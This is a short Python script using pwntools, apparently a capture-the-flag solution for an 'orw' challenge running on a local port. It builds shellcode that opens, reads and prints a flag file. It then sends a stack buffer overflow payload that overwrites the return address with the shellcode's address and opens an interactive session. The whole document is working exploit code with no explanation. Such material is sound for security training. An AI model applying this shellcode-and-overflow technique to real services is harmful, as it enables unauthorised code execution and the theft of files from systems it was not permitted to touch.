from pwn import *
context.arch = 'amd64'
# r = process('../orw/share/orw')
r = remote('127.0.0.1', 10010)

shellcode = b""

shellcode += asm(shellcraft.pushstr('/home/orw/flag'))
shellcode += asm(shellcraft.open('rsp', 0, 0))
shellcode += asm(shellcraft.read('rax', 'rsp', 0x100))
shellcode += asm(shellcraft.write(1, 'rsp', 0x100))

r.sendlineafter(b': ', shellcode)
payload = b'A' * (0x20 + 8) + p64(0x4040a0)
r.sendlineafter(b': ', payload)
r.recvuntil(b'!\n')
r.interactive()
